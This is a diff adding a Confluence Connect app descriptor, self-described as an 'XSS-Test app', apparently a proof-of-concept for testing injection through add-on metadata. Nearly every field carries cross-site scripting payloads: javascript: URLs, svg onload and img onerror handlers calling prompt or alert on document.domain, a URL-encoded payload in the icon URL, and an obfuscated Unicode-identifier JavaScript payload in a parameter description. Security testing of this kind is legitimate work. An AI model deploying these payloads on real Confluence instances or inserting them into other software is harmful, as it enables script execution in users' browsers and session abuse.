@@ -1,0 +1,86 @@
+{
+  "key": "confluence-helloworld-addon",
+  "name": "Hello World",
+  "description": "XSS-Test app <a href=javascript:alert(document.domain)>Click Me</a>",
+  "vendor": {
+    "name": "<svg/onload=prompt(document.domain)>",
+    "url": "https://example.com"
+  },
+  "baseUrl": "{{localBaseUrl}}",
+  "links": {
+    "self": "{{localBaseUrl}}/atlassian-connect.json",
+    "homepage": "{{localBaseUrl}}/atlassian-connect.json"
+  },
+  "authentication": {
+    "type": "jwt"
+  },
+  "lifecycle": {
+    "installed": "/installed"
+  },
+  "scopes": ["WRITE"],
+  "modules": {
+    "contentBylineItems": [
+      {
+        "url": "javascript:alert(1);//http://",
+        "context": "addon",
+        "target": {
+          "type": "inlinedialog"
+        },
+        "tooltip": {
+          "value": "\"><svg/onload=prompt(document.domain)>"
+        },
+        "icon": {
+          "width": 16,
+          "height": 16,
+          "url": "https://google.com/image.png?ver=%22%3E%3Csvg%2Fonload%3Dprompt(99)%3E"
+        },
+        "name": {
+          "value": "><svg/onload=prompt(document.domain)>"
+        },
+        "key": "byline-item"
+      }
+    ],
+    "dynamicContentMacros": [
+      {
+        "url": "/xss",
+        "description": {
+          "value": "><svg/onload=prompt(document.domain)>"
+        },
+        "documentation": {
+          "url": "google.com"
+        },
+        "icon": {
+          "url": "/img/macro-icon.png"
+        },
+        "categories": [
+          "formatting",
+          "development",
+          "external-content",
+          "reporting",
+          "<img src=a onerror=alert(document.domain)>"
+        ],
+        "outputType": "block",
+        "bodyType": "none",
+        "aliases": ["include"],
+        "name": {
+          "value": "><svg/onload=prompt(document.domain)>"
+        },
+        "key": "bitbucket-pull-request",
+        "parameters": [
+          {
+            "identifier": "query",
+            "name": {
+              "value": "><svg/onload=prompt(document.domain)>"
+            },
+            "description": {
+              "value": "ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+\"(ᨆ)\")()"
+            },
+            "type": "string",
+            "required": false,
+            "multiple": true
+          }
+        ]
+      }
+    ]
+  }
+}
